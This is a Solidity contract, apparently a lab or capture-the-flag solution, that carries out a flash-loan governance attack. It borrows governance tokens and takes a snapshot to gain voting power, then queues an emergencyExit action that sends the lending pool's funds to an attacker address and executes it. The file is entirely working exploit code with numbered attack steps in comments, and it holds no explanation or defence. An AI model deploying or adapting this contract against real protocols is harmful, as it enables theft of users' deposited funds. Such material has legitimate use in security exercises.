// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

// 1. exec flashloan, transfer all token to attackerâ€™s contract
// 2. Update snapshot, grant access to do action
// 3. Create and queue action
// 4. Execute action

interface ILenderGovernance {
  function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
  function executeAction(uint256 actionId) external payable returns (bytes memory);
}

interface IGovernanceToken {
  function snapshot() external returns (uint256);
  function getBalanceAtLastSnapshot(address account) external view returns (uint256);
  function getTotalSupplyAtLastSnapshot() external view returns (uint256);
}

contract GovernanceExploiter is IERC3156FlashBorrower {
  IERC3156FlashLender private _lender;
  ILenderGovernance private _lendergovernance;
  IGovernanceToken private _governanceToken;
  address private _attacker;
  uint256 private _actionId;

  constructor(address lender, address governance, address governanceToken, address attacker) {
    _lender = IERC3156FlashLender(lender);
    _lendergovernance = ILenderGovernance(governance);
    _governanceToken = IGovernanceToken(governanceToken);
    _attacker = attacker;
  }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
      require(
            msg.sender == address(_lender),
            "FlashBorrower: Untrusted lender"
        );
        require(
            initiator == address(this),
            "FlashBorrower: Untrusted loan initiator"
        );
         _governanceToken.snapshot();
         
         bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            _attacker
         );

         _actionId = _lendergovernance.queueAction(
          address(_lender),
          0,
          data
         );

        ERC20(token).approve(address(_lender), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function exploit() external {
      _lendergovernance.executeAction(_actionId);
    }

    function flashBorrow(
        uint256 amount
    ) public {
      address token = address(_governanceToken);
      uint256 _allowance = _lender.maxFlashLoan(token);
      uint256 _fee = _lender.flashFee(token, amount);
      uint256 _repayment = amount + _fee;
      ERC20(token).approve(address(_lender), _allowance + _repayment);
      _lender.flashLoan(this, token, amount, "0x");
    }
}